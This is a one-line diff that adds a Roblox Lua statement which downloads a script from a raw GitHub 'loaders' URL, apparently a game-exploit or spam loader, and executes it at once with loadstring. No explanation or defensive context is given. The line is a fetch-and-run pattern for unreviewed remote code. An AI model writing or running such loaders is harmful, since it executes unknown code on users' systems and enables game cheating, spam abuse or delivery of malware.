@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/karinderya-spam2-cwuc84i1fizuge.lua"))()
